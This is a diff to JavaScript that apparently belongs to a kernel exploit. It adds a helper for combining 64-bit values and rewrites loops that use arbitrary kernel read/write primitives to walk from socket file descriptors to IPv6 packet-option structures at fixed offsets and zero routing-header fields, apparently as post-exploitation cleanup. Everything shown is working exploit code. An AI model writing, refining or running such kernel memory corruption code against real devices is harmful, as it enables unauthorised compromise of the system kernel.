@@ -1507,28 +1507,33 @@ function get_fd_data_addr_big(fd) {
     
 try{  
 
-   for (let i = 0; i < sds.length; i++) {
-    const fd    = BigInt(sds[i]);         
-    const filep = kmem.read64(ofiles + fd * 8n);    
-    const sock  = kmem.read64(filep);             
-    const pcb   = kmem.read64(sock + 0x18n);        
-    const pkto  = kmem.read64(pcb + 0x118n);        
-    kmem.write64(pkto + 0x68n, 0n);                 
-  }
+   function read64_big(addr) {
+  const i = kmem.read64(addr);
+  const lo = BigInt(i.lo >>> 0);
+  const hi = BigInt(i.hi >>> 0);
+  return lo + (hi << 32n);
+}
 
- 
-  {
-    const fd    = BigInt(reclaim_sock);
-    const filep = kmem.read64(ofiles + fd * 8n);
-    const sock  = kmem.read64(filep);
-    const pcb   = kmem.read64(sock + 0x18n);
-    const pkto  = kmem.read64(pcb + 0x118n);
+
+ for (let i = 0; i < sds.length; i++) {
+    const fd    = BigInt(sds[i]);
+    const filep = read64_big(ofiles      + fd * 8n);
+    const sock  = read64_big(filep);
+    const pcb   = read64_big(sock    + 0x18n);
+    const pkto  = read64_big(pcb     + 0x118n);
     kmem.write64(pkto + 0x68n, 0n);
   }
+  {
+    const fd    = BigInt(reclaim_sock);
+    const filep = read64_big(ofiles      + fd * 8n);
+    const sock  = read64_big(filep);
+    const pcb   = read64_big(sock    + 0x18n);
+    const pkto  = read64_big(pcb     + 0x118n);
+    kmem.write64(pkto + 0x68n, 0n);
+  }
+  kmem.write64(worker_pktopts_big + 0x68n, 0n);
 
- 
-  kmem.write64(worker_pktopts + 0x68n, 0n);
-
+    
 log("routing‐header IPv6 fields zeroed");
    }
 
